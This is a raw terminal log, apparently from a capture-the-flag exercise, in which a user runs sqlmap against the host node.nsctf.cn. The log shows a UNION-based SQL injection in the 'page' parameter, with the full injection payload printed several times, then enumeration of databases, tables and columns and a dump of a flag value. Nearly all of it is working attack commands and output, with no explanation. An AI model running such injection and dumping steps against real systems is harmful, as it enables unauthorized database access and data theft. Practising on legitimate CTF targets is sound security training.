# 示例
```text
(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#pip}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:01:51 /2025-06-24/

[16:01:51] [INFO] parsing HTTP request from 'sql.txt'
[16:01:51] [INFO] testing connection to the target URL
[16:01:51] [INFO] testing if the target URL content is stable
[16:01:52] [INFO] target URL content is stable
[16:01:52] [INFO] testing if GET parameter 'page' is dynamic
[16:01:52] [WARNING] GET parameter 'page' does not appear to be dynamic
[16:01:52] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
[16:01:52] [INFO] testing for SQL injection on GET parameter 'page'
[16:01:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:01:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:01:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:01:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:01:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:01:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:01:54] [INFO] testing 'Generic inline queries'
[16:01:55] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:01:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:01:55] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:01:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:01:56] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[16:01:56] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[16:01:57] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 
[16:01:59] [ERROR] user quit

[*] ending @ 16:01:59 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt --dbms
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#pip}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python sqlmap [options]

sqlmap: error: --dbms option requires 1 argument
(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -h | grep db
    --dbms=DBMS         Force back-end DBMS to provided value
    --current-db        Retrieve DBMS current database
    --dbs               Enumerate DBMS databases
(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt --dbs 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#pip}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:02:27 /2025-06-24/

[16:02:27] [INFO] parsing HTTP request from 'sql.txt'
[16:02:27] [INFO] testing connection to the target URL
[16:02:27] [INFO] testing if the target URL content is stable
[16:02:27] [INFO] target URL content is stable
[16:02:27] [INFO] testing if GET parameter 'page' is dynamic
[16:02:27] [WARNING] GET parameter 'page' does not appear to be dynamic
[16:02:27] [WARNING] heuristic (basic) test shows that GET parameter 'page' might not be injectable
[16:02:28] [INFO] testing for SQL injection on GET parameter 'page'
[16:02:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:02:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:02:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:02:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:02:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:02:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:02:30] [INFO] testing 'Generic inline queries'
[16:02:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:02:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:02:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:02:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:02:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[16:02:32] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[16:02:33] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[16:02:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[16:02:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:02:46] [INFO] target URL appears to have 22 columns in query
[16:02:46] [WARNING] applying generic concatenation (CONCAT)
[16:02:46] [INFO] GET parameter 'page' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[16:02:46] [INFO] checking if the injection point on GET parameter 'page' is a false positive
GET parameter 'page' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[16:02:50] [INFO] testing if GET parameter 'size' is dynamic
[16:02:50] [WARNING] GET parameter 'size' does not appear to be dynamic
[16:02:50] [WARNING] heuristic (basic) test shows that GET parameter 'size' might not be injectable
[16:02:50] [INFO] testing for SQL injection on GET parameter 'size'
[16:02:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:02:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:02:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:02:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:02:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:02:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:02:52] [INFO] testing 'Generic inline queries'
[16:02:52] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:02:52] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:02:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:02:53] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:02:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[16:02:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[16:02:54] [INFO] testing 'Oracle AND time-based blind'
[16:02:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[16:02:58] [WARNING] GET parameter 'size' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 202 HTTP(s) requests:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:02:58] [INFO] testing MySQL
[16:02:59] [INFO] confirming MySQL
[16:02:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.0
[16:02:59] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys

[16:02:59] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:02:59 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt -D phpmyadmin --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#pip}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:05:08 /2025-06-24/

[16:05:08] [INFO] parsing HTTP request from 'sql.txt'
[16:05:08] [INFO] resuming back-end DBMS 'mysql' 
[16:05:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:05:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5
[16:05:09] [INFO] fetching tables for database: 'phpmyadmin'
Database: phpmyadmin
[19 tables]
+------------------------+
| pma__bookmark          |
| pma__central_columns   |
| pma__column_info       |
| pma__designer_settings |
| pma__export_templates  |
| pma__favorite          |
| pma__history           |
| pma__navigationhiding  |
| pma__pdf_pages         |
| pma__recent            |
| pma__relation          |
| pma__savedsearches     |
| pma__table_coords      |
| pma__table_info        |
| pma__table_uiprefs     |
| pma__tracking          |
| pma__userconfig        |
| pma__usergroups        |
| pma__users             |
+------------------------+

[16:05:09] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:05:09 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt -D information_schema --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#pip}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:05:40 /2025-06-24/

[16:05:40] [INFO] parsing HTTP request from 'sql.txt'
[16:05:40] [INFO] resuming back-end DBMS 'mysql' 
[16:05:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:05:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5
[16:05:40] [INFO] fetching tables for database: 'information_schema'
Database: information_schema
[61 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_DATAFILES                  |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
+---------------------------------------+

[16:05:40] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:05:40 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.6#pip}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:06:24 /2025-06-24/

[16:06:24] [INFO] parsing HTTP request from 'sql.txt'
[16:06:24] [INFO] resuming back-end DBMS 'mysql' 
[16:06:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:06:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5
[16:06:24] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys

[16:06:24] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:06:24 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt -D mysql --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.6#pip}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:06:41 /2025-06-24/

[16:06:41] [INFO] parsing HTTP request from 'sql.txt'
[16:06:41] [INFO] resuming back-end DBMS 'mysql' 
[16:06:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:06:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5
[16:06:41] [INFO] fetching tables for database: 'mysql'
Database: mysql
[32 tables]
+---------------------------+
| event                     |
| plugin                    |
| user                      |
| columns_priv              |
| db                        |
| engine_cost               |
| flags                     |
| func                      |
| general_log               |
| gtid_executed             |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| innodb_index_stats        |
| innodb_table_stats        |
| ndb_binlog_index          |
| proc                      |
| procs_priv                |
| proxies_priv              |
| server_cost               |
| servers                   |
| slave_master_info         |
| slave_relay_log_info      |
| slave_worker_info         |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
+---------------------------+

[16:06:41] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:06:41 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt -D mysql -T flags --columns
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#pip}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:07:12 /2025-06-24/

[16:07:12] [INFO] parsing HTTP request from 'sql.txt'
[16:07:12] [INFO] resuming back-end DBMS 'mysql' 
[16:07:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:07:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5
[16:07:12] [INFO] fetching columns for table 'flags' in database 'mysql'
Database: mysql
Table: flags
[1 column]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(40) |
+--------+-------------+

[16:07:12] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:07:12 /2025-06-24/

(base) lianbang@lianbangdeMacBook-Pro tmp % sqlmap -r sql.txt -D mysql -T flags -C flag --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#pip}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:07:44 /2025-06-24/

[16:07:44] [INFO] parsing HTTP request from 'sql.txt'
[16:07:44] [INFO] resuming back-end DBMS 'mysql' 
[16:07:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: page (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 22 columns
    Payload: page=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(CONCAT('qkbvq','xccaJoxVpGregUWGHTBaTtuEJGtZwkFjOHRISGub'),'qjzqq')-- ZeFv&size=60
---
[16:07:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL 5
[16:07:44] [INFO] fetching entries of column(s) 'flag' for table 'flags' in database 'mysql'
Database: mysql
Table: flags
[1 entry]
+----------------------------------------+
| flag                                   |
+----------------------------------------+
| flag{ef057af07743d44a0d47e11c2d07c3cf} |
+----------------------------------------+

[16:07:45] [INFO] table 'mysql.flags' dumped to CSV file '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn/dump/mysql/flags.csv'
[16:07:45] [INFO] fetched data logged to text files under '/Users/lianbang/.local/share/sqlmap/output/node.nsctf.cn'

[*] ending @ 16:07:45 /2025-06-24/
```